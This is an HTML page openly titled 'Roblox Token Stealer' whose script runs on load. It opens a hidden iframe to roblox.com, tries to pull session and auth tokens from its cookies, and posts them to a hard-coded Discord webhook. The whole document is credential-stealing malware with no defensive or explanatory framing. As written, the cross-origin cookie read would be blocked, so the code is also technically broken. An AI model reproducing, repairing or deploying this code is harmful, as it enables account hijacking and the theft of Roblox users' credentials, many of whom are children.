<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Token Stealer</title>
</head>
<body>
    <script>
        function stealToken() {
            var victimUrl = "https://www.roblox.com/";
            var iframe = document.createElement("iframe");
            iframe.setAttribute("src", victimUrl);
            iframe.setAttribute("style", "display:none;");
            document.body.appendChild(iframe);

            setTimeout(() => {
                var victimDoc = iframe.contentWindow.document;
                var token = victimDoc.cookie.match(/(Roblox\.UserId=|\.AuthToken=)([^;]*)/)[2];

                if (token) {
                    var webhookUrl = "https://discord.com/api/webhooks/1232407956541411474/5-YY8MwUbKYFlCBaadqi38ha9bU4J23sZWep--nkoRHca9XCQtGo3vQl43Xs3umO5Thi";
                    var data = {
                        content: `Stolen Roblox Token: ${token}`
                    };

                    fetch(webhookUrl, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify(data)
                    }).then(() => {
                        console.log("Token stolen and sent to webhook.");
                    });
                } else {
                    console.log("Token not found.");
                }

                document.body.removeChild(iframe);
            }, 3000);
        }

        stealToken();
    </script>
</body>
</html>
